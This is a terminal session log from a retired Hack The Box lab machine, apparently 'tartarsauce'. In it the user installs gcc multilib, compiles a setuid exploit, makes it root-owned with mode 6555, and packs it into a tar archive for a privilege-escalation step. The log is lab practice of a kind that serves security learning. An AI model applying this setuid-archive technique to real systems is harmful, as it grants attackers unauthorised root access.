+Unpacking libx32gcc-9-dev (9.3.0-11) ...                
+Selecting previously unselected package gcc-9-multilib. 
+Preparing to unpack .../31-gcc-9-multilib_9.3.0-11_amd64.deb ...                                                  
+Unpacking gcc-9-multilib (9.3.0-11) ...                 
+Selecting previously unselected package gcc-multilib.   
+Preparing to unpack .../32-gcc-multilib_4%3a9.2.1-3.1_amd64.deb ...                                               
+Unpacking gcc-multilib (4:9.2.1-3.1) ...                
+Setting up libc6-dev-i386 (2.30-4) ...                  
+Setting up lib32itm1 (10-20200418-1) ...                
+Setting up lib32ubsan1 (10-20200418-1) ...              
+Setting up libc6-x32 (2.30-4) ...                       
+Setting up libc6-dev-x32 (2.30-4) ...                   
+Setting up lib32gomp1 (10-20200418-1) ...               
+Setting up libx32gomp1 (10-20200418-1) ...              
+Setting up lib32quadmath0 (10-20200418-1) ...           
+Setting up libx32quadmath0 (10-20200418-1) ...          
+Setting up lib32atomic1 (10-20200418-1) ...             
+Setting up gcc-9-base:amd64 (9.3.0-11) ...              
+Setting up gcc-9-base:i386 (9.3.0-11) ...               
+Setting up libx32atomic1 (10-20200418-1) ...            
+Setting up libx32gcc-s1 (10-20200418-1) ...             
+Setting up libx32itm1 (10-20200418-1) ...               
+Setting up libasan5:amd64 (9.3.0-11) ...                
+Setting up libx32asan5 (9.3.0-11) ...                   
+Setting up cpp-9 (9.3.0-11) ...                         
+Setting up lib32asan5 (9.3.0-11) ...                    
+Setting up libx32gcc1 (1:10-20200418-1) ...             
+Setting up libx32stdc++6 (10-20200418-1) ...            
+Setting up libx32ubsan1 (10-20200418-1) ...             
+Setting up libgcc-9-dev:amd64 (9.3.0-11) ...            
+Setting up lib32gcc-9-dev (9.3.0-11) ...                
+Setting up libx32gcc-9-dev (9.3.0-11) ...               
+Setting up libobjc-9-dev:amd64 (9.3.0-11) ...           
+Setting up gcc-9 (9.3.0-11) ...                         
+Setting up libstdc++-9-dev:amd64 (9.3.0-11) ...         
+Setting up libgfortran-9-dev:amd64 (9.3.0-11) ...       
+Setting up gcc-9-multilib (9.3.0-11) ...                
+Setting up g++-9 (9.3.0-11) ...                         
+Setting up gcc-multilib (4:9.2.1-3.1) ...               
+Setting up gfortran-9 (9.3.0-11) ...                    
+Processing triggers for man-db (2.9.1-1) ...            
+Processing triggers for kali-menu (2020.2.0) ...        
+Processing triggers for libc-bin (2.30-4) ...           
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ gc                                                        
+gc            gcc-nm-8      gcov-dump-7                 
+gcalccmd      gcc-nm-9      gcov-dump-8                 
+gcc           gcc-ranlib    gcov-dump-9                 
+gcc-7         gcc-ranlib-7  gcov-tool                   
+gcc-8         gcc-ranlib-8  gcov-tool-7                 
+gcc-9         gcc-ranlib-9  gcov-tool-8                 
+gcc-ar        gcore         gcov-tool-9                 
+gcc-ar-7      gcov          gcps2vec.py                 
+gcc-ar-8      gcov-7        gcps2wld.py                 
+gcc-ar-9      gcov-8        gcr-viewer                  
+gcc-nm        gcov-9                                    
+gcc-nm-7      gcov-dump                                 
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ gcc -m32 -o exploit setuid.c                              
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ ls                                                        
+38861.txt    LinEnum.sh  notes.ctb~~   setuid.c         
+43348.txt    nmap        notes.ctb~~~  wp-load.php      
+exploit      notes.ctb   payload.tar                    
+exploit.PHP  notes.ctb~  procmon.sh                     
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ $TERM                                                     
+-bash: screen-256color: command not found               
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ mkdir -p /var/www/html/                                   
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ cp exploit /var/                                          
+backups/          lock/             spool/              
+BlackmagicDesign/ log/              tmp/                
+cache/            mail/             unicornscan/        
+lib/              opt/              www/                
+local/            run/                                  
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ mkdir -p var/www/html                                     
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ cp exploit var/www/html/                                  
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ chmod 6555 var/www/html/exploit                           
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ ls * var/www/html/exploit                                 
+38861.txt    notes.ctb     procmon.sh                   
+43348.txt    notes.ctb~    setuid.c                     
+exploit      notes.ctb~~   var/www/html/exploit         
+exploit.PHP  notes.ctb~~~  wp-load.php                  
+LinEnum.sh   payload.tar    
+
+nmap:         
+initial.gnmap  initial.nmap  initial.xml                
+
+var:          
+www           
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ sudo chown root exploit                                   
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ ls -al                                                    
+total 9744    
+drwxr-xr-x  4 arjun arjun    4096 May 11 22:53 .        
+drwxr-xr-x 18 arjun arjun    4096 May 11 20:01 ..       
+-rw-r--r--  1 arjun arjun    3492 May 11 21:30 38861.txt
+-rw-r--r--  1 arjun arjun    2059 May 11 20:15 43348.txt
+-rwxr-xr-x  1 root  arjun   15524 May 11 22:42 exploit  
+-rw-r--r--  1 arjun arjun      48 May 11 20:17 exploit.PHP                                                        
+-rw-r--r--  1 arjun arjun   46476 May 11 21:37 LinEnum.sh
+drwxr-xr-x  2 arjun arjun    4096 May 11 20:04 nmap     
+-rw-r--r--  1 arjun arjun 2600960 May 11 22:51 notes.ctb
+-rw-r--r--  1 arjun arjun 2379776 May 11 22:51 notes.ctb~
+-rw-r--r--  1 arjun arjun 2379776 May 11 22:48 notes.ctb~~                                                        
+-rw-r--r--  1 arjun arjun 2367488 May 11 22:47 notes.ctb~~~                                                       
+-rw-r--r--  1 arjun arjun  133120 May 11 21:45 payload.tar                                                        
+-rw-r--r--  1 arjun arjun     223 May 11 21:37 procmon.sh
+-rw-r--r--  1 arjun arjun     145 May 11 22:41 setuid.c 
+drwxr-xr-x  3 arjun arjun    4096 May 11 22:53 var      
+-rwxr-xr-x  1 arjun arjun    5492 May 11 21:33 wp-load.php                                                        
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ sudo chgrp root exploit                                   
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ sudo chmod 6555 exploit                                   
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ ls -al                                                    
+total 9744    
+drwxr-xr-x  4 arjun arjun    4096 May 11 22:53 .        
+drwxr-xr-x 18 arjun arjun    4096 May 11 20:01 ..       
+-rw-r--r--  1 arjun arjun    3492 May 11 21:30 38861.txt
+-rw-r--r--  1 arjun arjun    2059 May 11 20:15 43348.txt
+-r-sr-sr-x  1 root  root    15524 May 11 22:42 exploit  
+-rw-r--r--  1 arjun arjun      48 May 11 20:17 exploit.PHP                                                        
+-rw-r--r--  1 arjun arjun   46476 May 11 21:37 LinEnum.sh
+drwxr-xr-x  2 arjun arjun    4096 May 11 20:04 nmap     
+-rw-r--r--  1 arjun arjun 2600960 May 11 22:51 notes.ctb
+-rw-r--r--  1 arjun arjun 2379776 May 11 22:51 notes.ctb~
+-rw-r--r--  1 arjun arjun 2379776 May 11 22:48 notes.ctb~~                                                        
+-rw-r--r--  1 arjun arjun 2367488 May 11 22:47 notes.ctb~~~                                                       
+-rw-r--r--  1 arjun arjun  133120 May 11 21:45 payload.tar                                                        
+-rw-r--r--  1 arjun arjun     223 May 11 21:37 procmon.sh
+-rw-r--r--  1 arjun arjun     145 May 11 22:41 setuid.c 
+drwxr-xr-x  3 arjun arjun    4096 May 11 22:53 var      
+-rwxr-xr-x  1 arjun arjun    5492 May 11 21:33 wp-load.php                                                        
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ cp exploit var/www/html/exploit                           
+cp: cannot create regular file 'var/www/html/exploit': Permission denied                                          
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ sudo cp exploit var/www/html/exploit                      
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ sudo tar -czvf runme.tar.gz var/www/html/exploit          
+var/www/html/exploit        
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ ls -al                                                    
+total 9748    
+drwxr-xr-x  4 arjun arjun    4096 May 11 22:55 .        
+drwxr-xr-x 18 arjun arjun    4096 May 11 20:01 ..       
+-rw-r--r--  1 arjun arjun    3492 May 11 21:30 38861.txt
+-rw-r--r--  1 arjun arjun    2059 May 11 20:15 43348.txt
+-r-sr-sr-x  1 root  root    15524 May 11 22:42 exploit  
+-rw-r--r--  1 arjun arjun      48 May 11 20:17 exploit.PHP                                                        
+-rw-r--r--  1 arjun arjun   46476 May 11 21:37 LinEnum.sh
+drwxr-xr-x  2 arjun arjun    4096 May 11 20:04 nmap     
+-rw-r--r--  1 arjun arjun 2600960 May 11 22:51 notes.ctb
+-rw-r--r--  1 arjun arjun 2379776 May 11 22:51 notes.ctb~
+-rw-r--r--  1 arjun arjun 2379776 May 11 22:48 notes.ctb~~                                                        
+-rw-r--r--  1 arjun arjun 2367488 May 11 22:47 notes.ctb~~~                                                       
+-rw-r--r--  1 arjun arjun  133120 May 11 21:45 payload.tar                                                        
+-rw-r--r--  1 arjun arjun     223 May 11 21:37 procmon.sh
+-rw-r--r--  1 root  root     2707 May 11 22:55 runme.tar.gz                                                       
+-rw-r--r--  1 arjun arjun     145 May 11 22:41 setuid.c 
+drwxr-xr-x  3 arjun arjun    4096 May 11 22:53 var      
+-rwxr-xr-x  1 arjun arjun    5492 May 11 21:33 wp-load.php                                                        
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ 
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ sudo tar -czvf runme.tar.gz var/                          
+var/          
+var/www/      
+var/www/html/ 
+var/www/html/exploit        
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ ls -al                                                    
+total 9748    
+drwxr-xr-x  4 arjun arjun    4096 May 11 22:55 .        
+drwxr-xr-x 18 arjun arjun    4096 May 11 20:01 ..       
+-rw-r--r--  1 arjun arjun    3492 May 11 21:30 38861.txt
+-rw-r--r--  1 arjun arjun    2059 May 11 20:15 43348.txt
+-r-sr-sr-x  1 root  root    15524 May 11 22:42 exploit  
+-rw-r--r--  1 arjun arjun      48 May 11 20:17 exploit.PHP                                                        
+-rw-r--r--  1 arjun arjun   46476 May 11 21:37 LinEnum.sh
+drwxr-xr-x  2 arjun arjun    4096 May 11 20:04 nmap     
+-rw-r--r--  1 arjun arjun 2600960 May 11 22:51 notes.ctb
+-rw-r--r--  1 arjun arjun 2379776 May 11 22:51 notes.ctb~
+-rw-r--r--  1 arjun arjun 2379776 May 11 22:48 notes.ctb~~                                                        
+-rw-r--r--  1 arjun arjun 2367488 May 11 22:47 notes.ctb~~~                                                       
+-rw-r--r--  1 arjun arjun  133120 May 11 21:45 payload.tar                                                        
+-rw-r--r--  1 arjun arjun     223 May 11 21:37 procmon.sh
+-rw-r--r--  1 root  root     2768 May 11 22:56 runme.tar.gz                                                       
+-rw-r--r--  1 arjun arjun     145 May 11 22:41 setuid.c 
+drwxr-xr-x  3 arjun arjun    4096 May 11 22:53 var      
+-rwxr-xr-x  1 arjun arjun    5492 May 11 21:33 wp-load.php                                                        
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ rm -r var/                                                
+rm: remove write-protected regular file 'var/www/html/exploit'? yes                                               
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ ls -al                                                    
+total 9744    
+drwxr-xr-x  3 arjun arjun    4096 May 11 23:02 .        
+drwxr-xr-x 18 arjun arjun    4096 May 11 20:01 ..       
+-rw-r--r--  1 arjun arjun    3492 May 11 21:30 38861.txt
+-rw-r--r--  1 arjun arjun    2059 May 11 20:15 43348.txt
+-r-sr-sr-x  1 root  root    15524 May 11 22:42 exploit  
+-rw-r--r--  1 arjun arjun      48 May 11 20:17 exploit.PHP                                                        
+-rw-r--r--  1 arjun arjun   46476 May 11 21:37 LinEnum.sh
+drwxr-xr-x  2 arjun arjun    4096 May 11 20:04 nmap     
+-rw-r--r--  1 arjun arjun 2600960 May 11 22:51 notes.ctb
+-rw-r--r--  1 arjun arjun 2379776 May 11 22:51 notes.ctb~
+-rw-r--r--  1 arjun arjun 2379776 May 11 22:48 notes.ctb~~                                                        
+-rw-r--r--  1 arjun arjun 2367488 May 11 22:47 notes.ctb~~~                                                       
+-rw-r--r--  1 arjun arjun  133120 May 11 21:45 payload.tar                                                        
+-rw-r--r--  1 arjun arjun     223 May 11 21:37 procmon.sh
+-rw-r--r--  1 root  root     2768 May 11 22:56 runme.tar.gz                                                       
+-rw-r--r--  1 arjun arjun     145 May 11 22:41 setuid.c 
+-rwxr-xr-x  1 arjun arjun    5492 May 11 21:33 wp-load.php                                                        
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ sudo mkdir var/www/html                                   
+mkdir: cannot create directory ‘var/www/html’: No such file or directory                                          
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ sudo mkdir -p var/www/html                                
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ cp exploit var/www/html/                                  
+cp: cannot create regular file 'var/www/html/exploit': Permission denied                                          
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ sudo cp exploit var/www/html/                             
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ ls -al var/www/html/                                      
+total 24      
+drwxr-xr-x 2 root root  4096 May 11 23:02 .             
+drwxr-xr-x 3 root root  4096 May 11 23:02 ..            
+-r-xr-xr-x 1 root root 15524 May 11 23:02 exploit       
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ sudo chmod 655 var/www/html/exploit                       
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ ls -al                                                    
+total 9748    
+drwxr-xr-x  4 arjun arjun    4096 May 11 23:02 .        
+drwxr-xr-x 18 arjun arjun    4096 May 11 20:01 ..       
+-rw-r--r--  1 arjun arjun    3492 May 11 21:30 38861.txt
+-rw-r--r--  1 arjun arjun    2059 May 11 20:15 43348.txt
+-r-sr-sr-x  1 root  root    15524 May 11 22:42 exploit  
+-rw-r--r--  1 arjun arjun      48 May 11 20:17 exploit.PHP                                                        
+-rw-r--r--  1 arjun arjun   46476 May 11 21:37 LinEnum.sh
+drwxr-xr-x  2 arjun arjun    4096 May 11 20:04 nmap     
+-rw-r--r--  1 arjun arjun 2600960 May 11 22:51 notes.ctb
+-rw-r--r--  1 arjun arjun 2379776 May 11 22:51 notes.ctb~
+-rw-r--r--  1 arjun arjun 2379776 May 11 22:48 notes.ctb~~                                                        
+-rw-r--r--  1 arjun arjun 2367488 May 11 22:47 notes.ctb~~~                                                       
+-rw-r--r--  1 arjun arjun  133120 May 11 21:45 payload.tar                                                        
+-rw-r--r--  1 arjun arjun     223 May 11 21:37 procmon.sh
+-rw-r--r--  1 root  root     2768 May 11 22:56 runme.tar.gz                                                       
+-rw-r--r--  1 arjun arjun     145 May 11 22:41 setuid.c 
+drwxr-xr-x  3 root  root     4096 May 11 23:02 var      
+-rwxr-xr-x  1 arjun arjun    5492 May 11 21:33 wp-load.php                                                        
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ sudo tar -czf runme.tar.gz var                            
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ ls -al                                                    
+total 9748    
+drwxr-xr-x  4 arjun arjun    4096 May 11 23:02 .        
+drwxr-xr-x 18 arjun arjun    4096 May 11 20:01 ..       
+-rw-r--r--  1 arjun arjun    3492 May 11 21:30 38861.txt
+-rw-r--r--  1 arjun arjun    2059 May 11 20:15 43348.txt
+-r-sr-sr-x  1 root  root    15524 May 11 22:42 exploit  
+-rw-r--r--  1 arjun arjun      48 May 11 20:17 exploit.PHP                                                        
+-rw-r--r--  1 arjun arjun   46476 May 11 21:37 LinEnum.sh
+drwxr-xr-x  2 arjun arjun    4096 May 11 20:04 nmap     
+-rw-r--r--  1 arjun arjun 2600960 May 11 22:51 notes.ctb
+-rw-r--r--  1 arjun arjun 2379776 May 11 22:51 notes.ctb~
+-rw-r--r--  1 arjun arjun 2379776 May 11 22:48 notes.ctb~~                                                        
+-rw-r--r--  1 arjun arjun 2367488 May 11 22:47 notes.ctb~~~                                                       
+-rw-r--r--  1 arjun arjun  133120 May 11 21:45 payload.tar                                                        
+-rw-r--r--  1 arjun arjun     223 May 11 21:37 procmon.sh
+-rw-r--r--  1 root  root     2758 May 11 23:03 runme.tar.gz                                                       
+-rw-r--r--  1 arjun arjun     145 May 11 22:41 setuid.c 
+drwxr-xr-x  3 root  root     4096 May 11 23:02 var      
+-rwxr-xr-x  1 arjun arjun    5492 May 11 21:33 wp-load.php                                                        
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ ls var/www/html/exploit                                   
+var/www/html/exploit        
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ ls -al                                                    
+total 9748    
+drwxr-xr-x  4 arjun arjun    4096 May 11 23:02 .        
+drwxr-xr-x 18 arjun arjun    4096 May 11 20:01 ..       
+-rw-r--r--  1 arjun arjun    3492 May 11 21:30 38861.txt
+-rw-r--r--  1 arjun arjun    2059 May 11 20:15 43348.txt
+-r-sr-sr-x  1 root  root    15524 May 11 22:42 exploit  
+-rw-r--r--  1 arjun arjun      48 May 11 20:17 exploit.PHP                                                        
+-rw-r--r--  1 arjun arjun   46476 May 11 21:37 LinEnum.sh
+drwxr-xr-x  2 arjun arjun    4096 May 11 20:04 nmap     
+-rw-r--r--  1 arjun arjun 2600960 May 11 22:51 notes.ctb
+-rw-r--r--  1 arjun arjun 2379776 May 11 22:51 notes.ctb~
+-rw-r--r--  1 arjun arjun 2379776 May 11 22:48 notes.ctb~~                                                        
+-rw-r--r--  1 arjun arjun 2367488 May 11 22:47 notes.ctb~~~                                                       
+-rw-r--r--  1 arjun arjun  133120 May 11 21:45 payload.tar                                                        
+-rw-r--r--  1 arjun arjun     223 May 11 21:37 procmon.sh
+-rw-r--r--  1 root  root     2758 May 11 23:03 runme.tar.gz                                                       
+-rw-r--r--  1 arjun arjun     145 May 11 22:41 setuid.c 
+drwxr-xr-x  3 root  root     4096 May 11 23:02 var      
+-rwxr-xr-x  1 arjun arjun    5492 May 11 21:33 wp-load.php                                                        
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ sudo chmod 6555 var/www/html/exploit                      
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ ls -al var/www/html/exploit                               
+-r-sr-sr-x 1 root root 15524 May 11 23:02 var/www/html/exploit                                                    
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ sudo tar -czf runme.tar.gz var                      arjun@arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$  
